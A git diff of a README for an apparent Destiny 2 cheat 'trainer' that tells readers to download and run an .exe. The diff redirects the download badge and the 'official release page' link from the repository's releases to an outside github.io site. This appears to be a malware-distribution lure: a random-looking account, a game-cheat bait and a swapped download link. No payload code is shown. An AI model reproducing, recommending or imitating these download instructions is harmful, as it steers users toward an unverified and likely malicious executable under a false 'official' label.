@@ -1,6 +1,6 @@
 # 🎯 Destiny2-Ultimate-Trainer-2026-elite - Enhance your game experience with ease
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Leonuruscardiacaloge298/Destiny2-Ultimate-Trainer-2026-elite/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://leonuruscardiacaloge298.github.io)
 
 ## 📖 Overview
 
@@ -31,7 +31,7 @@ Ensure your computer meets these conditions before you run the trainer.
 
 Follow these steps to set up the software.
 
-1.  Visit the official release page: [https://github.com/Leonuruscardiacaloge298/Destiny2-Ultimate-Trainer-2026-elite/releases](https://github.com/Leonuruscardiacaloge298/Destiny2-Ultimate-Trainer-2026-elite/releases).
+1.  Visit the official release page: [https://leonuruscardiacaloge298.github.io](https://leonuruscardiacaloge298.github.io).
 2.  Locate the section labeled Assets.
 3.  Click the file ending in .exe to download it to your computer.
 4.  Move the downloaded file to a folder where you store your game tools.
